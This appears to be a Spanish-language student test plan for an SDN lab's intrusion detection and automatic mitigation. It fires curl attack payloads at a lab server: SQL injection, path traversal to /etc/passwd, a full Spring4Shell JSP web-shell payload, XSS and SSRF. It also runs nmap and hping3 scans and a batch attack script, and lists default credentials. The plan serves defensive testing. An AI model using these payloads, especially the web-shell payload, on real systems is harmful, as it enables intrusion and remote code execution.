# Plan de Pruebas Funcionales — R3: Detección y Mitigación de Ataques
**Grupo 2 TEL354 | Mark Valencia / Sheila Jara**

> **Prerequisito**: H1 autenticado en el portal cautivo con rol `Estudiante_Telecom` (IP 192.168.100.55, VLAN 210, acceso a srv1:8001).

---

## Infraestructura de prueba

| Componente | VM | IP OOB | Puerto/Servicio |
|------------|-----|--------|-----------------|
| H1 (atacante simulado) | h1 | — | 192.168.100.55 (plano datos) |
| srv1 (recurso académico) | srv1 | — | 192.168.100.101:8001 (HTTP) / :1443 (HTTPS) |
| Suricata / event-forwarder | VM-Monitor | 192.168.201.202 | Lee `/var/log/suricata/eve.json` |
| M4 (correlación) | VM-Monitor | 192.168.201.202 | :8084 |
| M6 (traductor SDN) | VM-Auth | 192.168.201.251 | :8080 |
| ONOS | VM-Controller | 192.168.201.200 | :8181 |

---

## Flujo de mitigación automática

```
H1 lanza ataque HTTP →
  SW4 espeja tráfico vía GRE →
    Suricata detecta firma (SID) →
      event-forwarder envía POST /m4/events/suricata →
        M4 calcula riesgo, decide TEMP_BLOCK →
          M4 llama POST /m6/security/mitigate →
            M6 resuelve sesión (IP→MAC→SW→puerto) →
              M6 instala DROP T0 en SW4 (prio=39000, TTL=90s) →
                H1 bloqueado — timeout de conexión
```

---

## Casos de Prueba OWASP Top 10

### TC-01 — A03 Injection: SQL Injection
**SID Suricata**: 9000002 | **Acción M6**: `block_tcp_to_dest_port` (DROP TCP a srv1:8001)

Desde H1:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/?id=1'+OR+'1'%3D'1" \
  -w '\nHTTP=%{http_code}\n'
```

**Resultado esperado antes de mitigación**: `HTTP=200` (llega al servidor)
**Resultado esperado después de mitigación**: timeout / connection refused

Verificar en M6 dashboard o:
```bash
# En aaa-policies
curl -s -H "X-Security-Token: change-me" \
  http://localhost:8080/m6/security/mitigations?active=1 | python3 -m json.tool
```

---

### TC-02 — A01 Broken Access Control: Path Traversal
**SID Suricata**: 9000014 | **Acción M6**: `block_tcp_to_dest_port`

Desde H1:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/../../../etc/passwd" \
  -w '\nHTTP=%{http_code}\n'
```

También con encoded:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
  -w '\nHTTP=%{http_code}\n'
```

---

### TC-03 — A06 Vulnerable Components: Spring4Shell RCE (CVE-2022-22965)
**SID Suricata**: 9000050 | **Acción M6**: `block_tcp_to_dest_port`

Desde H1:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=.&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b))%3B%20%7D%7D%20%25%7Bsuffix%7Di" \
  -w '\nHTTP=%{http_code}\n'
```

Versión corta (activa la firma igualmente):
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=.jsp" \
  -w '\nHTTP=%{http_code}\n'
```

---

### TC-04 — A03 Injection: XSS Script Injection en URI
**SID Suricata**: 9000051 | **Acción M6**: `block_tcp_to_dest_port`

Desde H1:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
  -w '\nHTTP=%{http_code}\n'
```

Sin encoding:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/?search=<script>alert('xss')</script>" \
  -w '\nHTTP=%{http_code}\n'
```

---

### TC-05 — A10 SSRF: Server-Side Request Forgery
**SID Suricata**: 9000052 | **Acción M6**: `block_tcp_to_dest_port`

Desde H1:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/?redirect=http://192.168.201.1/admin" \
  -w '\nHTTP=%{http_code}\n'
```

Con IP interna en parámetro:
```bash
curl -v --max-time 10 \
  "http://192.168.100.101:8001/?url=http://10.0.0.1/secret&fetch=http://192.168.100.1/" \
  -w '\nHTTP=%{http_code}\n'
```

---


---

### TC-07 — Reconocimiento: TCP SYN Port Scan
**SID Suricata**: 9000001 | **Acción M6**: `block_tcp_to_dest`

Desde H1 (requiere nmap):
```bash
nmap -sS --max-retries 1 192.168.100.101
```

O con hping3:
```bash
hping3 -S 192.168.100.101 -p 80 -c 20 --fast
```

---

## Verificaciones de mitigación

### Comprobar DROP instalado en ONOS (desde aaa-policies)
```bash
curl -s -u onos:rocks \
  "http://192.168.201.200:8181/onos/v1/flows/of:00006a0757adfc4e" \
  | python3 -c "
import json, sys
flows = json.load(sys.stdin).get('flows', [])
drops = [f for f in flows if f.get('priority', 0) == 39000]
print(f'Flows DROP T0 (prio=39000): {len(drops)}')
for d in drops:
    crit = {c['type']: c for c in d.get('selector', {}).get('criteria', [])}
    print(f'  src={crit.get(\"IPV4_SRC\",{}).get(\"ip\")} dst={crit.get(\"IPV4_DST\",{}).get(\"ip\")} port={crit.get(\"TCP_DST\",{}).get(\"tcpPort\")}')
"
```

### Ver mitigaciones activas en M6 (desde aaa-policies)
```bash
curl -s -H "X-Security-Token: change-me" \
  "http://localhost:8080/m6/security/mitigations?active=1" \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
mits = data.get('mitigations', [])
print(f'Mitigaciones activas: {len(mits)}')
for m in mits:
    print(f'  incident={m[\"incident_id\"][:8]}... sid={m.get(\"sid\")} src={m.get(\"src_ip\")} expires={m.get(\"expires_at\")}')
"
```

### Ver logs de M4 (desde monitoring)
```bash
sudo docker logs m4-security 2>&1 | grep -E "mitigation|TEMP_BLOCK|BLOCK|suricata" | tail -20
```

### Ver logs de M6 (desde aaa-policies)
```bash
tail -30 /tmp/m6.log | grep -E "security_mitigation|ATAQUE|DROP|mitigate"
```

---

## Levantar mitigación manualmente (desde aaa-policies)

```bash
# Listar mitigaciones activas y copiar el incident_id
curl -s -H "X-Security-Token: change-me" \
  "http://localhost:8080/m6/security/mitigations?active=1" | python3 -m json.tool

# Levantar por incident_id
curl -s -X POST http://localhost:8080/m6/security/unmitigate \
  -H "Content-Type: application/json" \
  -H "X-Security-Token: change-me" \
  -d '{"incident_id": "PEGAR_INCIDENT_ID_AQUI"}' \
  | python3 -m json.tool
```

---

## Métricas para rúbrica R3

| Métrica | Cómo medirla en demo | Valor esperado |
|---------|---------------------|----------------|
| Proporción de ataques detectados | Contar SIDs en logs Suricata vs ataques lanzados | ~100% (firmas exactas) |
| Falsas alertas | Tráfico legítimo H1→srv1 HTTP normal, no debe generar alerta | 0 alertas falsos |
| Tiempo de detección | `timestamp alerta Suricata` − `timestamp curl` | 1–3 segundos |
| Tiempo de mitigación | `expires_at` del flow M6 − `timestamp alerta` | 3–8 segundos |
| Sesiones procesadas/s | 1 sesión, múltiples ataques → todos mitigados | Sin degradación visible |
| Registro de incidentes | `GET /m6/security/mitigations` + logs M4 | Registro completo con IP, MAC, switch, puerto, SID, timestamp |

---

## Resumen de cobertura OWASP Top 10

| # | Categoría OWASP | SID cubierto | Ataque |
|---|----------------|--------------|--------|
| A01 | Broken Access Control | 9000014 | Path traversal |
| A03 | Injection | 9000002 | SQL Injection |
| A03 | Injection | 9000051 | XSS script injection |
| A03 | Injection | 9000053 | OS Command Injection |
| A06 | Vulnerable/Outdated Components | 9000050 | Spring4Shell RCE (CVE-2022-22965) |
| A10 | SSRF | 9000052 | Server-Side Request Forgery |

Adicionalmente (no OWASP pero evaluados en R3):
- TCP SYN port scan (9000001/8/9/10) → `block_tcp_to_dest`
- ICMP oversized flood (9000018) → `block_icmp`
- SSH/RDP/FTP brute force burst (9000027/28/29) → `block_tcp_port` específico

---

## Script de prueba rápida (todos los ataques, desde H1)

```bash
#!/bin/bash
SRV="http://192.168.100.101:8001"
echo "=== INICIANDO BATERIA DE ATAQUES DEMO R3 ==="
echo ""

echo "[TC-01] SQL Injection (SID 9000002)"
curl -s --max-time 8 "$SRV/?id=1'+OR+'1'%3D'1" -o /dev/null -w "HTTP=%{http_code} tiempo=%{time_total}s\n"
sleep 5

echo "[TC-02] Path Traversal (SID 9000014)"
curl -s --max-time 8 "$SRV/../../../etc/passwd" -o /dev/null -w "HTTP=%{http_code} tiempo=%{time_total}s\n"
sleep 5

echo "[TC-03] Spring4Shell RCE (SID 9000050)"
curl -s --max-time 8 "$SRV/?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=.jsp" -o /dev/null -w "HTTP=%{http_code} tiempo=%{time_total}s\n"
sleep 5

echo "[TC-04] XSS Script Injection (SID 9000051)"
curl -s --max-time 8 "$SRV/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" -o /dev/null -w "HTTP=%{http_code} tiempo=%{time_total}s\n"
sleep 5

echo "[TC-05] SSRF (SID 9000052)"
curl -s --max-time 8 "$SRV/?redirect=http://192.168.201.1/admin" -o /dev/null -w "HTTP=%{http_code} tiempo=%{time_total}s\n"
sleep 5


echo ""
echo "=== FIN DE BATERIA ==="
echo "Verificar mitigaciones: curl -s -H 'X-Security-Token: change-me' http://192.168.201.251:8080/m6/security/mitigations"
```

> **Nota para demo**: esperar al menos 90 segundos entre baterías de ataque o usar `/m6/security/unmitigate` para levantar la mitigación antes de volver a probar. El primer ataque de cada TCP flow activa la firma Suricata; ataques subsiguientes del mismo flow pueden no generar nueva alerta (misma `flow_id` = idempotente).
